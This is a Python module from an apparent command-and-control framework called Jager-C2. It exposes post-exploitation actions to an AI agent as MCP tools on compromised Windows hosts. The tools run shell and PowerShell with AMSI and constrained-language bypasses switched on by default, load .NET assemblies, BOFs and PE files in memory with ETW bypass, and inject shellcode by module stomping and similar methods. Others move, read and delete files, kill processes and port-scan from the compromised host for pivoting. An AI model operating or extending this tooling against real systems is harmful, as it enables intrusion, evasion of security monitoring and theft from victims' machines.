"""Execution tools for Jager-C2 MCP server."""

from __future__ import annotations

import json
from typing import Any, Dict

try:
    from task_client import queue_task
    from task_types import TaskType
except ImportError:
    from ..task_client import queue_task
    from ..task_types import TaskType
TOOLS = [
    {
        "name": "exec_shell",
        "description": "Execute a shell command on the target (cmd.exe)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "command": {"type": "string"},
                "timeout": {"type": "integer", "default": 30},
            },
            "required": ["session_id", "command"],
        },
    },
    {
        "name": "exec_powershell",
        "description": "Execute PowerShell on the target (unmanaged, AMSI-bypassed)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "script": {"type": "string"},
                "bypass_amsi": {"type": "boolean", "default": True},
                "bypass_clm": {"type": "boolean", "default": True},
            },
            "required": ["session_id", "script"],
        },
    },
    {
        "name": "exec_assembly",
        "description": "Execute a .NET assembly in memory (no disk touch)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "assembly_path": {"type": "string"},
                "arguments": {"type": "string", "default": ""},
                "bypass_etw": {"type": "boolean", "default": True},
            },
            "required": ["session_id", "assembly_path"],
        },
    },
    {
        "name": "exec_bof",
        "description": "Execute a Beacon Object File (BOF/COFF) in-process",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "bof_path": {"type": "string"},
                "arguments": {"type": "string", "default": ""},
                "pack_format": {"type": "string"},
            },
            "required": ["session_id", "bof_path"],
        },
    },
    {
        "name": "exec_shellcode",
        "description": "Inject and execute raw shellcode",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "shellcode_path": {"type": "string"},
                "target_pid": {"type": "integer", "default": 0},
                "method": {
                    "type": "string",
                    "enum": ["module_stomp", "threadless", "map_view", "early_bird", "remote_thread"],
                    "default": "module_stomp",
                },
            },
            "required": ["session_id", "shellcode_path"],
        },
    },
    {
        "name": "exec_pe",
        "description": "Execute a PE file in memory (reflective loading)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "pe_path": {"type": "string"},
                "arguments": {"type": "string", "default": ""},
                "output": {"type": "boolean", "default": True},
            },
            "required": ["session_id", "pe_path"],
        },
    },
    {
        "name": "fs_ls",
        "description": "List directory contents on the target",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "path": {"type": "string", "default": "."},
            },
            "required": ["session_id"],
        },
    },
    {
        "name": "fs_cat",
        "description": "Read a file from the target",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "path": {"type": "string"},
            },
            "required": ["session_id", "path"],
        },
    },
    {
        "name": "fs_pwd",
        "description": "Get current working directory on the target",
        "inputSchema": {
            "type": "object",
            "properties": {"session_id": {"type": "string"}},
            "required": ["session_id"],
        },
    },
    {
        "name": "fs_cd",
        "description": "Change directory on the target",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "path": {"type": "string"},
            },
            "required": ["session_id", "path"],
        },
    },
    {
        "name": "fs_upload",
        "description": "Upload a file to the target",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "local_path": {"type": "string"},
                "remote_path": {"type": "string"},
            },
            "required": ["session_id", "local_path", "remote_path"],
        },
    },
    {
        "name": "fs_download",
        "description": "Download a file from the target",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "remote_path": {"type": "string"},
            },
            "required": ["session_id", "remote_path"],
        },
    },
    {
        "name": "fs_rm",
        "description": "Delete a file or directory on the target",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "path": {"type": "string"},
            },
            "required": ["session_id", "path"],
        },
    },
    {
        "name": "proc_ps",
        "description": "List running processes on the target",
        "inputSchema": {
            "type": "object",
            "properties": {"session_id": {"type": "string"}},
            "required": ["session_id"],
        },
    },
    {
        "name": "proc_kill",
        "description": "Kill a process by PID on the target",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "pid": {"type": "integer"},
            },
            "required": ["session_id", "pid"],
        },
    },
    {
        "name": "net_ifconfig",
        "description": "Get network interface configuration on the target",
        "inputSchema": {
            "type": "object",
            "properties": {"session_id": {"type": "string"}},
            "required": ["session_id"],
        },
    },
    {
        "name": "net_netstat",
        "description": "Get active network connections on the target",
        "inputSchema": {
            "type": "object",
            "properties": {"session_id": {"type": "string"}},
            "required": ["session_id"],
        },
    },
    {
        "name": "net_portscan",
        "description": "Scan ports from the compromised host (pivot scanning)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "target": {"type": "string"},
                "ports": {"type": "string"},
            },
            "required": ["session_id", "target", "ports"],
        },
    },
]


async def handle(tool_name: str, args: Dict[str, Any], client) -> Dict[str, Any]:
    """Handle execution, filesystem, process, and network tool calls."""
    session_id = args.get("session_id", "")

    if tool_name == "exec_shell":
        return await queue_task(client, session_id, TaskType.TASK_SHELL, args["command"])

    if tool_name == "exec_powershell":
        payload = json.dumps({"script": args["script"], "bypass_amsi": args.get("bypass_amsi", True)})
        return await queue_task(client, session_id, TaskType.TASK_POWERSHELL, payload)

    if tool_name == "exec_assembly":
        payload = json.dumps(
            {
                "path": args["assembly_path"],
                "arguments": args.get("arguments", ""),
                "bypass_etw": args.get("bypass_etw", True),
            }
        )
        return await queue_task(client, session_id, TaskType.TASK_EXECUTE_ASSEMBLY, payload)

    if tool_name == "exec_bof":
        payload = json.dumps(
            {
                "path": args["bof_path"],
                "arguments": args.get("arguments", ""),
                "pack_format": args.get("pack_format", ""),
            }
        )
        return await queue_task(client, session_id, TaskType.TASK_BOF, payload)

    if tool_name == "exec_shellcode":
        payload = json.dumps(
            {
                "path": args["shellcode_path"],
                "method": args.get("method", "module_stomp"),
                "target_pid": args.get("target_pid", 0),
            }
        )
        return await queue_task(client, session_id, TaskType.TASK_SHELLCODE, payload)

    if tool_name == "exec_pe":
        payload = json.dumps({"path": args["pe_path"], "arguments": args.get("arguments", "")})
        return await queue_task(client, session_id, TaskType.TASK_INLINE_EXECUTE, payload)

    if tool_name == "fs_ls":
        return await queue_task(client, session_id, TaskType.TASK_LS, args.get("path", "."))

    if tool_name == "fs_cat":
        return await queue_task(client, session_id, TaskType.TASK_CAT, args["path"])

    if tool_name == "fs_pwd":
        return await queue_task(client, session_id, TaskType.TASK_PWD, "")

    if tool_name == "fs_cd":
        return await queue_task(client, session_id, TaskType.TASK_CD, args["path"])

    if tool_name == "fs_upload":
        payload = json.dumps({"local_path": args["local_path"], "remote_path": args["remote_path"]})
        return await queue_task(client, session_id, TaskType.TASK_UPLOAD, payload)

    if tool_name == "fs_download":
        return await queue_task(client, session_id, TaskType.TASK_DOWNLOAD, args["remote_path"])

    if tool_name == "fs_rm":
        return await queue_task(client, session_id, TaskType.TASK_RM, args["path"])

    if tool_name == "proc_ps":
        return await queue_task(client, session_id, TaskType.TASK_PS, "")

    if tool_name == "proc_kill":
        return await queue_task(client, session_id, TaskType.TASK_KILL_PROCESS, str(args["pid"]))

    if tool_name == "net_ifconfig":
        return await queue_task(client, session_id, TaskType.TASK_IFCONFIG, "")

    if tool_name == "net_netstat":
        return await queue_task(client, session_id, TaskType.TASK_NETSTAT, "")

    if tool_name == "net_portscan":
        payload = json.dumps({"target": args["target"], "ports": args["ports"]})
        return await queue_task(client, session_id, TaskType.TASK_PORTSCAN, payload)

    return {"error": f"Unknown tool: {tool_name}"}
